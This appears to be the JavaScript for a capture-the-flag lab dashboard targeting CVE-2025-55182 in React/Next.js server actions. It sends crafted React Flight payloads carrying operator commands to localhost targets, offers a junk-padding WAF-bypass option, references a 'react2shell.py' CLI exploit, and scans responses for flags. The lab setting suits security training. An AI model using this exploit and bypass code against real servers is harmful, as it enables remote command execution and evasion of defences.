// CVE-2025-55182 Lab Dashboard

let logCount = 0;

function addLog(type, message) {
    const logEntries = document.getElementById('log-entries');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;

    const now = new Date();
    const timestamp = now.toTimeString().split(' ')[0];

    entry.innerHTML = `
        <span class="timestamp">${timestamp}</span>
        <span class="message">${message}</span>
    `;

    logEntries.appendChild(entry);
    logEntries.scrollTop = logEntries.scrollHeight;

    logCount++;
    document.getElementById('log-count').textContent = `${logCount} entries`;
}

function clearLogs() {
    const logEntries = document.getElementById('log-entries');
    logEntries.innerHTML = '';
    logCount = 0;
    document.getElementById('log-count').textContent = '0 entries';
    addLog('info', 'Logs cleared');
}

async function testTarget(url) {
    addLog('info', `Testing target: ${url}`);

    try {
        const response = await fetch(url, {
            method: 'HEAD',
            mode: 'no-cors'
        });
        addLog('success', `Target ${url} is reachable`);
    } catch (error) {
        addLog('error', `Target ${url} is not reachable: ${error.message}`);
    }
}

async function runExploit() {
    const targetUrl = document.getElementById('target-url').value;
    const command = document.getElementById('command').value;
    const payloadType = document.getElementById('payload-type').value;
    const output = document.getElementById('exploit-output');

    output.textContent = 'Executing exploit...';
    addLog('warning', `Exploit attempt: ${targetUrl} - Command: ${command}`);

    // Generate the React Flight payload
    const payload = generatePayload(command, payloadType);

    try {
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain;charset=UTF-8',
                'Accept': 'text/x-component',
                'Next-Action': 'a1b2c3d4e5f6' // Dummy action ID
            },
            body: payload,
            mode: 'cors'
        });

        const text = await response.text();
        output.textContent = text || 'No response body';

        if (response.status === 200) {
            addLog('success', `Exploit succeeded on ${targetUrl}`);
            checkForFlags(text);
        } else if (response.status === 403) {
            addLog('error', `Exploit blocked by WAF (403 Forbidden)`);
            output.textContent = 'WAF blocked the request (403 Forbidden)';
        } else {
            addLog('warning', `Unexpected response: ${response.status}`);
        }
    } catch (error) {
        output.textContent = `Error: ${error.message}\n\nNote: This web-based tester has CORS limitations.\nFor full exploit testing, use the CLI tool:\n\npython react2shell.py ${targetUrl} -c "${command}"`;
        addLog('error', `Exploit failed: ${error.message}`);
    }
}

function generatePayload(command, type) {
    const basePayload = `["$@1",["$","div",null,{"children":["$","$L2",null,{}]}]]`;

    switch (type) {
        case 'waf-bypass':
            // Add junk data padding to bypass WAF inspection limits
            const junk = 'A'.repeat(100000);
            return junk + basePayload;
        case 'encoded':
            return encodeURIComponent(basePayload);
        default:
            return basePayload;
    }
}

function checkForFlags(text) {
    // Check for flag patterns
    const flag1Regex = /FLAG\{.*env.*\}/i;
    const flag2Regex = /FLAG\{.*r00t.*\}/i;
    const flag3Regex = /FLAG\{.*h1dd3n.*\}/i;

    if (flag1Regex.test(text)) {
        markFlagFound('flag1', text.match(flag1Regex)[0]);
    }
    if (flag2Regex.test(text)) {
        markFlagFound('flag2', text.match(flag2Regex)[0]);
    }
    if (flag3Regex.test(text)) {
        markFlagFound('flag3', text.match(flag3Regex)[0]);
    }
}

function markFlagFound(flagId, flagValue) {
    const flagCard = document.getElementById(flagId);
    flagCard.classList.add('found');
    flagCard.querySelector('.flag-status').textContent = `Found: ${flagValue}`;
    addLog('success', `FLAG CAPTURED: ${flagValue}`);
}

function copyCommand(command) {
    navigator.clipboard.writeText(command).then(() => {
        addLog('info', `Copied: ${command}`);

        // Visual feedback
        const cards = document.querySelectorAll('.command-card');
        cards.forEach(card => {
            if (card.querySelector('code').textContent === command) {
                card.style.borderColor = '#22c55e';
                setTimeout(() => {
                    card.style.borderColor = '#333';
                }, 1000);
            }
        });
    });
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('connection-status').textContent = 'Connected';
    addLog('info', 'Dashboard initialized. Ready to log attacks.');

    // Test connectivity to targets
    setTimeout(() => {
        testTarget('http://localhost:3011');
        testTarget('http://localhost:3012');
        testTarget('http://localhost:3013');
    }, 1000);
});
